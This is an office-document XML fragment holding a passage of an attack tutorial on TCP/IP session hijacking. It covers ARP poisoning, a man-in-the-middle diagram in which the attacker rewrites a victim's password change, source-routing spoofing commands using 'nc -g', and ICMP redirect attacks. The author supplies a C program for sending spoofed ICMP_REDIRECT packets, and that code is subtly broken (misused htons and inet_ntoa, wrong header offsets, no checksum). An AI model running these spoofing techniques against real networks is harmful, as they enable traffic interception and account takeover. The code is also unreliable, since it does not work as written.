      <text:p text:style-name="P702">This is done by active passive sniffing of the network for packets travelling</text:p>
      <text:p text:style-name="P703">which are related to the target session, modifying them, and injecting them back</text:p>
      <text:p text:style-name="P704">into the Network so that the two connected hosts cannot easily tell that any</text:p>
      <text:p text:style-name="P705">modification of the packets has been done.</text:p>
      <text:p text:style-name="P706"/>
      <text:p text:style-name="P707">Before an attacker can carry out a man-in-the-middle attack between two</text:p>
      <text:p text:style-name="P708">connected hosts, they must first somehow get between the communications path of</text:p>
      <text:p text:style-name="P709">Host C and Host S. The classical way of doing this is known as "ARP spoofing"</text:p>
      <text:p text:style-name="P710">or "ARP poisoning".</text:p>
      <text:p text:style-name="P711">The ARP table on a host is just a method that a networked host uses to keep</text:p>
      <text:p text:style-name="P712">track of MAC and IP address associations. Every so often, one host on the</text:p>
      <text:p text:style-name="P713">network might send out an ARP request. An ARP request asks a question, like</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P714">this "Is your IP address x.x.x.x? If so, send me your MAC address.". The</text:p>
      <text:p text:style-name="P715">message is broadcast across the network, and the host with the IP address</text:p>
      <text:p text:style-name="P716">x.x.x.x replies to the ARP request, providing it's MAC address with it. ARP</text:p>
      <text:p text:style-name="P717">spoofing therefore is sending out ARP replies (nobody has necessarily asked for</text:p>
      <text:p text:style-name="P718">it, the attacker just sends one) with a spoofed source address from the IP</text:p>
      <text:p text:style-name="P719">address you want the hosts to believe you are. The host will then update it's</text:p>
      <text:p text:style-name="P720">own ARP cache table, now associating your machine's MAC address with the spoofed</text:p>
      <text:p text:style-name="P721">IP address, thus sending all traffic meant for x.x.x.x to you.</text:p>
      <text:p text:style-name="P722">In this case then, the attacker's need for ARP spoofing in his planned</text:p>
      <text:p text:style-name="P723">"man-in-the-middle" attack is the process of changing Host C's ARP cache to</text:p>
      <text:p text:style-name="P724">believe that the IP address of Host S is the attacker's IP address, and changing</text:p>
      <text:p text:style-name="P725">Host S's ARP cache to make it believe that Host C's IP address is the</text:p>
      <text:p text:style-name="P726">attacker's. All very interesting, but how do we actually do this? Here is a</text:p>
      <text:p text:style-name="P727">simple diagram of what happens during an ARP poisoning/spoofing attack:</text:p>
      <text:p text:style-name="P728"/>
      <text:p text:style-name="P729"/>
      <text:p text:style-name="P730">******************************************</text:p>
      <text:p text:style-name="P731">...The attacker broadcasts an ARP reply, claiming that it infact owns the IP</text:p>
      <text:p text:style-name="P732">address x.x.x.x</text:p>
      <text:p text:style-name="P733"/>
      <text:p text:style-name="P734">Host X: DST (Host S), SRC (Host C), DATA ("I own x.x.x.x, my MAC address is</text:p>
      <text:p text:style-name="P735">xx:xx:xx:xx")</text:p>
      <text:p text:style-name="P736"/>
      <text:p text:style-name="P737">Host X: DST (Host C), SRC (Host S), DATA ("I own y.y.y.y, my MAC address is</text:p>
      <text:p text:style-name="P738">yy:yy:yy:yy.")</text:p>
      <text:p text:style-name="P739">******************************************</text:p>
      <text:p text:style-name="P740"/>
      <text:p text:style-name="P741">What the attacker has done is, forge an ARP reply to be pretending to originate</text:p>
      <text:p text:style-name="P742">from Host C, to Host S, saying that it infact owns the IP address x.x.x.x, and</text:p>
      <text:p text:style-name="P743">that it's MAC address is xx:xx:xx:xx. Host S now believes that Host C's IP</text:p>
      <text:p text:style-name="P744">address is x.x.x.x, and it IS, but it also believes now that Host C's MAC</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P745">address is xx:xx:xx:xx, but it's NOT, it's the attacker's MAC address! Now</text:p>
      <text:p text:style-name="P746">every time Host S has a packet that it intends for Host C, it searches through</text:p>
      <text:p text:style-name="P747">it's ARP cache, and determines that Host C's MAC address is xx:xx:xx:xx, but it</text:p>
      <text:p text:style-name="P748">is not, it is infact the attacker's address, but believes so because of your</text:p>
      <text:p text:style-name="P749">spoofed ARP reply!</text:p>
      <text:p text:style-name="P750"/>
      <text:p text:style-name="P751">Then the attacker spoofs an ARP reply to be pretending from Host S, to Host C,</text:p>
      <text:p text:style-name="P752">telling it that it owns the IP address y.y.y.y. It sees that the ARP reply is</text:p>
      <text:p text:style-name="P753">coming from yy:yy:yy:yy, and thus associates the IP address y.y.y.y with the</text:p>
      <text:p text:style-name="P754">ATTACKER's MAC address yy:yy:yy:yy.</text:p>
      <text:p text:style-name="P755"/>
      <text:p text:style-name="P756">Now that the attacker has both hosts believing that each other's MAC addresses</text:p>
      <text:p text:style-name="P757">are infact the attacker's, all he needs to do now is watch all packets</text:p>
      <text:p text:style-name="P758">travelling through his machine that are related to the connection between Host S</text:p>
      <text:p text:style-name="P759">and Host C that he is attempting to hijack, modify them accordingly, and then</text:p>
      <text:p text:style-name="P760">forward them to the host it was originally intended for so that their connection</text:p>
      <text:p text:style-name="P761">isn't interrupted.</text:p>
      <text:p text:style-name="P762"/>
      <text:p text:style-name="P763">Here is a small diagram of what would be happening during a Man-In-the-Middle</text:p>
      <text:p text:style-name="P764">session hijacking attack, assuming that the ARP poisoning attack had already</text:p>
      <text:p text:style-name="P765">taken place:</text:p>
      <text:p text:style-name="P766"/>
      <text:p text:style-name="P767"/>
      <text:p text:style-name="P768">******************************************</text:p>
      <text:p text:style-name="P769">Host S: DST (Host C), DATA ("Welcome to the system. You are using the bash</text:p>
      <text:p text:style-name="P770">shell") -&gt; Host C</text:p>
      <text:p text:style-name="P771"/>
      <text:p text:style-name="P772">...sent to Host X (attacker) because of the earlier ARP poisoning attack. Host</text:p>
      <text:p text:style-name="P773">X forwards the packet, not making any changes...</text:p>
      <text:p text:style-name="P774"/>
      <text:p text:style-name="P775">Host C: DST (Host S), DATA ("ls") -&gt; Host S</text:p>
      <text:p text:style-name="P776"/>
      <text:p text:style-name="P777">...again, Host X (attacker) receives this because it tricked Host C with the ARP</text:p>
      <text:p text:style-name="P778">poisoning attack above. Host X forwards the packet to Host S without any</text:p>
      <text:p text:style-name="P779">changes, because they are only issuing the 'ls' command...</text:p>
      <text:p text:style-name="P780"/>
      <text:p text:style-name="P781">Host S: DST (Host C), DATA ("tmp codes exploits Desktop mp3s") -&gt; Host C</text:p>
      <text:p text:style-name="P782">...Host X again decides not to make any modifications to the packet, as Host S</text:p>
      <text:p text:style-name="P783">(the server) is only sending the directory listings back, nothing special...</text:p>
      <text:p text:style-name="P784"/>
      <text:p text:style-name="P785">Host C: DST (Host S), DATA ("passwd") -&gt; Host S</text:p>
      <text:p text:style-name="P786"/>
      <text:p text:style-name="P787">...The attacker's head shoots up. The user is going to change their password.</text:p>
      <text:p text:style-name="P788">The attacker can edit the packet in which the user specifies their new password,</text:p>
      <text:p text:style-name="P789">and set it to what they want. Host X forwards the packet to Host S without any</text:p>
      <text:p text:style-name="P790">changes...</text:p>
      <text:p text:style-name="P791"/>
      <text:p text:style-name="P792">Host S: DST (Host C), DATA ("(current) UNIX password: ") -&gt; Host C</text:p>
      <text:p text:style-name="P793"/>
      <text:p text:style-name="P794">...Host X forwards the packet with out any modifications to Host C...</text:p>
      <text:p text:style-name="P795"/>
      <text:p text:style-name="P796">Host C: DST (Host S), DATA ("elitehacker") -&gt; Host S</text:p>
      <text:p text:style-name="P797"/>
      <text:p text:style-name="P798">...Host X receives the packet. Although the attacker now has the user's</text:p>
      <text:p text:style-name="P799">password, it doesn't really matter, because he'll issue a new password is a few</text:p>
      <text:p text:style-name="P800">moments, and he (the attacker) will modify it...</text:p>
      <text:p text:style-name="P801"/>
      <text:p text:style-name="P802">Host S: DST (Host C), DATA ("New UNIX password: ") -&gt; Host C</text:p>
      <text:p text:style-name="P803"/>
      <text:p text:style-name="P804">...Host X forwards the packet to Host C, with no modifications. The time is</text:p>
      <text:p text:style-name="P805">near to when the attacker will modify Host C's packets...</text:p>
      <text:p text:style-name="P806"/>
      <text:soft-page-break/>
      <text:p text:style-name="P807">Host C: DST (Host S), DATA ("elitehacker123") -&gt; Host S</text:p>
      <text:p text:style-name="P808"/>
      <text:p text:style-name="P809">...Host X receives the packet. The attacker modifies the packet data to now</text:p>
      <text:p text:style-name="P810">contain "elitehacker234", and injects the packet back into the network, and</text:p>
      <text:p text:style-name="P811">forwards it to Host S...</text:p>
      <text:p text:style-name="P812"/>
      <text:p text:style-name="P813">Host S: DST (Host C), DATA ("Retype new UNIX password: ") -&gt; Host C</text:p>
      <text:p text:style-name="P814"/>
      <text:p text:style-name="P815">...Host X forwards the packet with no modifcations to Host C...</text:p>
      <text:p text:style-name="P816"/>
      <text:p text:style-name="P817">Host C: DST (Host S), DATA ("elitehacker123") -&gt; Host S</text:p>
      <text:p text:style-name="P818"/>
      <text:p text:style-name="P819">...Host X receives the packet, the attacker modifies the packet, and edits the</text:p>
      <text:p text:style-name="P820">packet data to say "elitehacker234", and forwards the packet appropriately to</text:p>
      <text:p text:style-name="P821">Host S...</text:p>
      <text:p text:style-name="P822"/>
      <text:p text:style-name="P823">Host S: DST (Host C), DATA ("passwd: all authentication tokens updated</text:p>
      <text:p text:style-name="P824">successfully.") -&gt; Host C</text:p>
      <text:p text:style-name="P825"/>
      <text:p text:style-name="P826">...Host X receives the packet, and as usual, forwards it to Host C...</text:p>
      <text:p text:style-name="P827">******************************************</text:p>
      <text:p text:style-name="P828"/>
      <text:p text:style-name="P829">At this point, the user on Host C happily presumes that their password has been</text:p>
      <text:p text:style-name="P830">changed successfully (they saw the messages themselves), and gets on with their</text:p>
      <text:p text:style-name="P831">daily work. However, little do they know that the attacker actually edited the</text:p>
      <text:p text:style-name="P832">packets, and the password is now "elitehacker234", not "elitehacker123" as the</text:p>
      <text:p text:style-name="P833">victim thinks.</text:p>
      <text:p text:style-name="P834"/>
      <text:p text:style-name="P835"/>
      <text:p text:style-name="P836"/>
      <text:p text:style-name="P837">--[ 1.0 ATTACKS - ROUTING ATTACKS ]--</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P838">When packets leave a system through their network interface, to travel across</text:p>
      <text:p text:style-name="P839">the Internet to a given destination host, the best route is chosen for the</text:p>
      <text:p text:style-name="P840">packet to ensure the quickest way to the destination host is taken. <text:s/>However,</text:p>
      <text:p text:style-name="P841">various vulnerabilities exist in TCP/IP which allow attackers to interfere with</text:p>
      <text:p text:style-name="P842">the route that legimate user's packets take to their destination, potentially</text:p>
      <text:p text:style-name="P843">allowing attackers to perform sniffing, hijacking and other various attacks.</text:p>
      <text:p text:style-name="P844"/>
      <text:p text:style-name="P845">One such example is Source routing.</text:p>
      <text:p text:style-name="P846"/>
      <text:p text:style-name="P847"/>
      <text:p text:style-name="P848">--] 1.1 ATTACKS - ROUTING ATTACKS - SOURCE ROUTING</text:p>
      <text:p text:style-name="P849">Source routing is an example of a classical spoofing attack, and is a pretty old</text:p>
      <text:p text:style-name="P850">trick in itself. <text:s/>The theory behind a source routing attack is the idea that you</text:p>
      <text:p text:style-name="P851">can specify the route a packet takes, rather than just letting it go through the</text:p>
      <text:p text:style-name="P852">routers. <text:s/>This way, because it didn't travel through routers, but through the</text:p>
      <text:p text:style-name="P853">route of the attacker's choice, packets sent can have a spoofed address, and the</text:p>
      <text:p text:style-name="P854">spoofing attack is non-blind.</text:p>
      <text:p text:style-name="P855">What is meant by non-blind is that unlike Sequence Number Prediction attacks for</text:p>
      <text:p text:style-name="P856">example, you can actually receive packets back.</text:p>
      <text:p text:style-name="P857">This particular type of routing attack could be useful for an attacker in a</text:p>
      <text:p text:style-name="P858">situation such as his/her target host, Company A, filters all packets from the</text:p>
      <text:p text:style-name="P859">Internet, excluding those coming from Company B. <text:s/>If an attacker could source</text:p>
      <text:p text:style-name="P860">route packets to travel through Company B's servers, the packets would be</text:p>
      <text:p text:style-name="P861">accepted, rather than dropped as Company A's servers are configured.</text:p>
      <text:p text:style-name="P862"/>
      <text:p text:style-name="P863">Here's a simple example of how an attacker could spoof his address to appear to</text:p>
      <text:p text:style-name="P864">have</text:p>
      <text:p text:style-name="P865">originated from a trusted IP address, rather than his own, on a UNIX machine:</text:p>
      <text:p text:style-name="P866"/>
      <text:p text:style-name="P867"/>
      <text:p text:style-name="P868">******************************************</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P869">[hacker@mybox.org /root]# ifconfig eth0:0 inet 192.168.3.201 netmask</text:p>
      <text:p text:style-name="P870">255.255.255.255</text:p>
      <text:p text:style-name="P871"/>
      <text:p text:style-name="P872">[hacker@mybox.org /root]# nc -g 192.168.3.197 -g 192.168.3.198 -g 192.168.3.199</text:p>
      <text:p text:style-name="P873">192.168.3.200 21</text:p>
      <text:p text:style-name="P874">******************************************</text:p>
      <text:p text:style-name="P875"/>
      <text:p text:style-name="P876">Here, the attacker attempts to initiate an FTP connection, with a spoofed source</text:p>
      <text:p text:style-name="P877">address of 192.168.3.201, by routing his connection through some other machines</text:p>
      <text:p text:style-name="P878">on the local network, instead of routers.</text:p>
      <text:p text:style-name="P879"/>
      <text:p text:style-name="P880">However, although this attack is effective when successful, not all machines</text:p>
      <text:p text:style-name="P881">(UNIX and UNIX-like) are configured by default to relay source routed TCP stream</text:p>
      <text:p text:style-name="P882">packets. <text:s/>If one of machines an attacker attempts to route his packets through</text:p>
      <text:p text:style-name="P883">does not accept sourcr routed TCP packets, the spoofing attack will consequently</text:p>
      <text:p text:style-name="P884">fail.</text:p>
      <text:p text:style-name="P885">One major upside to this attack for an attacker is that the attack is non-blind,</text:p>
      <text:p text:style-name="P886">meaning that he/she can see the packets, just like an ordinary connection,</text:p>
      <text:p text:style-name="P887">however it is limited to their local network.</text:p>
      <text:p text:style-name="P888"/>
      <text:p text:style-name="P889">Although this is quite a serious vulnerability in the TCP/IP suite, it is very</text:p>
      <text:p text:style-name="P890">easily fixed. <text:s/>All that is needed is that the root user changes the contents of</text:p>
      <text:p text:style-name="P891">/proc/sys/net/ipv4/conf/all/accept_source_route to 0.</text:p>
      <text:p text:style-name="P892"/>
      <text:p text:style-name="P893"/>
      <text:p text:style-name="P894">--] 1.2 ATTACKS - ROUTING ATTACKS - ICMP REDIRECTS</text:p>
      <text:p text:style-name="P895">As mentioned above, routers basically just determine the most efficient route to</text:p>
      <text:p text:style-name="P896">the proposed destination host, and send the packet off on that route. <text:s/>To keep</text:p>
      <text:p text:style-name="P897">this system as efficient as possible, when a packet is sent to the default</text:p>
      <text:p text:style-name="P898">router on a network, if there is a closer router to the machine sending the</text:p>
      <text:p text:style-name="P899">packet, the router sends an ICMP redirect packet back to the networked machine,</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P900">instructing it to send the packets to the other router on the network instead.</text:p>
      <text:p text:style-name="P901">However, this little system has a potentially serious flaw: what if an attacker</text:p>
      <text:p text:style-name="P902">spoofs an ICMP_REDIRECT packet to be pretending to be from the router to the</text:p>
      <text:p text:style-name="P903">user's machine, telling the machine that his (the attacker's) box is actually</text:p>
      <text:p text:style-name="P904">the best router to send the packets to instead. <text:s/>All packets in that connection</text:p>
      <text:p text:style-name="P905">sent from the user on the network will then be instead sent to the attacker's</text:p>
      <text:p text:style-name="P906">machine, which he can do what he likes with. <text:s/>Modify them (could be used as a</text:p>
      <text:p text:style-name="P907">hijacking attack), drop them, or whatever he/she likes. <text:s/>Here's a very simple</text:p>
      <text:p text:style-name="P908">diagram of the sort of activity on the network, during an ICMP_REDIRECT attack:</text:p>
      <text:p text:style-name="P909"/>
      <text:p text:style-name="P910">******************************************</text:p>
      <text:p text:style-name="P911">Host C: SRC (Host C), SYN (ISN A), DST (Host S) -&gt; Router A</text:p>
      <text:p text:style-name="P912">Host X: SRC (Router A), ICMP_REDIRECT (Host X), DST (Host C) -&gt; Host C</text:p>
      <text:p text:style-name="P913">Host C: SRC (Host C), SYN (ISN A), DST (Host S) -&gt; Host X</text:p>
      <text:p text:style-name="P914"/>
      <text:p text:style-name="P915">...attacker now has control of the packet. <text:s/>He/she can do what they like with</text:p>
      <text:p text:style-name="P916">it, but should redirect it to the destination...</text:p>
      <text:p text:style-name="P917"/>
      <text:p text:style-name="P918">Host X: SRC (Host C), SYN (ISN A), DST (Host S) -&gt; Host S</text:p>
      <text:p text:style-name="P919"/>
      <text:p text:style-name="P920">...Attacker redirected packet to original destination, so Host C doesn't get</text:p>
      <text:p text:style-name="P921">suspicious about the connection request not being made...</text:p>
      <text:p text:style-name="P922">******************************************</text:p>
      <text:p text:style-name="P923"/>
      <text:p text:style-name="P924">In this example attack, Host C (the client) attempted to send a connection</text:p>
      <text:p text:style-name="P925">request to Host S via the default network router, Router A. <text:s/>However, before the</text:p>
      <text:p text:style-name="P926">packet could get there, Host X (the attacker) spoofed an ICMP_REDIRECT packet</text:p>
      <text:p text:style-name="P927">from Router A, telling Host C to send the packets via his own box (Host X,</text:p>
      <text:p text:style-name="P928">obviously to do illegimate things with). <text:s/>Host X then forwarded the packet to</text:p>
      <text:p text:style-name="P929">the proper destination (Host S), so as to not make Host C suspicious. <text:s/>Quite</text:p>
      <text:p text:style-name="P930">obviously this type of attack could be used as a TCP/IP session hijacking</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P931">attack.</text:p>
      <text:p text:style-name="P932"/>
      <text:p text:style-name="P933">Here's a small program I have written as an example of how such an attack could</text:p>
      <text:p text:style-name="P934">be implemented into a program:</text:p>
      <text:p text:style-name="P935"/>
      <text:p text:style-name="P936"/>
      <text:p text:style-name="P937">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P938">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P939">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P940">#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P941">#include &lt;netdb.h&gt;</text:p>
      <text:p text:style-name="P942">#include &lt;netinet/ip.h&gt;</text:p>
      <text:p text:style-name="P943">#include &lt;netinet/ip_icmp.h&gt;</text:p>
      <text:p text:style-name="P944">int main(int argc, char *argv[]) {</text:p>
      <text:p text:style-name="P945"><text:s text:c="8"/>if(argc &lt; 2) {</text:p>
      <text:p text:style-name="P946"><text:s text:c="16"/>printf("Usage: %s &lt;host&gt;\n", argv[0]);</text:p>
      <text:p text:style-name="P947"><text:s text:c="16"/>exit(0);</text:p>
      <text:p text:style-name="P948"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P949"/>
      <text:p text:style-name="P950"><text:s text:c="8"/>int sock;</text:p>
      <text:p text:style-name="P951"><text:s text:c="8"/>char packet[5000];</text:p>
      <text:p text:style-name="P952"><text:s text:c="8"/>struct sockaddr_in dest;</text:p>
      <text:p text:style-name="P953"><text:s text:c="8"/>struct hostent *host;</text:p>
      <text:p text:style-name="P954"><text:s text:c="8"/>struct iphdr *ip = (struct iphdr *) packet;</text:p>
      <text:p text:style-name="P955"><text:s text:c="8"/>struct icmphdr *icmp = (struct icmp *) packet + sizeof(struct iphdr);</text:p>
      <text:p text:style-name="P956"><text:s text:c="8"/>if((host = gethostbyname(argv[1])) == NULL) {</text:p>
      <text:p text:style-name="P957"><text:s text:c="16"/>printf("Couldn't resolve host!\n");</text:p>
      <text:p text:style-name="P958"><text:s text:c="16"/>exit(-1);</text:p>
      <text:p text:style-name="P959"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P960"/>
      <text:p text:style-name="P961"><text:s text:c="8"/>if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P962"><text:s text:c="16"/>printf("Couldn't make socket!\n");</text:p>
      <text:p text:style-name="P963"><text:s text:c="16"/>printf("You must be root to create a raw socket.\n");</text:p>
      <text:p text:style-name="P964"><text:s text:c="16"/>exit(-1);</text:p>
      <text:p text:style-name="P965"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P966"/>
      <text:p text:style-name="P967"><text:s text:c="8"/>dest.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P968"><text:s text:c="8"/>dest.sin_addr = *((struct in_addr *)host-&gt;h_addr);</text:p>
      <text:p text:style-name="P969"><text:s text:c="8"/>ip-&gt;ihl = 5;</text:p>
      <text:p text:style-name="P970"><text:s text:c="8"/>ip-&gt;id = htons(1337);</text:p>
      <text:p text:style-name="P971"><text:s text:c="8"/>ip-&gt;ttl = 255;</text:p>
      <text:p text:style-name="P972"><text:s text:c="8"/>ip-&gt;tos = 0;</text:p>
      <text:p text:style-name="P973"><text:s text:c="8"/>ip-&gt;protocol = IPPROTO_ICMP;</text:p>
      <text:p text:style-name="P974"><text:s text:c="8"/>ip-&gt;version = 4;</text:p>
      <text:p text:style-name="P975"><text:s text:c="8"/>ip-&gt;frag_off = 0;</text:p>
      <text:p text:style-name="P976"><text:s text:c="8"/>ip-&gt;saddr = htons("192.168.3.201");</text:p>
      <text:p text:style-name="P977"><text:s text:c="8"/>ip-&gt;daddr = inet_ntoa(dest.sin_addr);</text:p>
      <text:p text:style-name="P978"><text:s text:c="8"/>ip-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);</text:p>
      <text:p text:style-name="P979"><text:s text:c="8"/>ip-&gt;check = 0;</text:p>
      <text:p text:style-name="P980"><text:s text:c="8"/>icmp-&gt;checksum = 0;</text:p>
      <text:p text:style-name="P981"><text:s text:c="8"/>icmp-&gt;type = ICMP_REDIRECT;</text:p>
      <text:p text:style-name="P982"><text:s text:c="8"/>icmp-&gt;code = 0;</text:p>
      <text:p text:style-name="P983"><text:s text:c="8"/>printf("Sent spoofed ICMP_REDIRECT packet from 192.168.3.201 to %s!\n",</text:p>
      <text:p text:style-name="P984"><text:tab/><text:tab/>argv[1]);</text:p>
      <text:p text:style-name="P985"><text:s text:c="8"/>sendto(sock, packet, ip-&gt;tot_len, 0, (struct sockaddr *)&amp;dest,<text:s/></text:p>
      <text:p text:style-name="P986"><text:tab/><text:tab/>sizeof(struct sockaddr));</text:p>
      <text:p text:style-name="P987"><text:s text:c="8"/>return(0);</text:p>
      <text:p text:style-name="P988">}</text:p>
      <text:p text:style-name="P989">*************************************CUT HERE**********************************</text:p>
      <text:p text:style-name="P9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nrik Rosander</meta:initial-creator>
    <dc:creator>Henrik Rosander</dc:creator>
    <meta:creation-date>2020-09-16T13:58:00Z</meta:creation-date>
    <dc:date>2020-09-16T15:08:00Z</dc:date>
    <meta:template xlink:href="Normal.dotm" xlink:type="simple"/>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:editing-duration>PT1500S</meta:editing-duration>
    <meta:document-statistic meta:page-count="32" meta:paragraph-count="88" meta:word-count="7052" meta:character-count="44342" meta:row-count="311" meta:non-whitespace-character-count="37378"/>
  </office:meta>
</office:document-meta>
</file>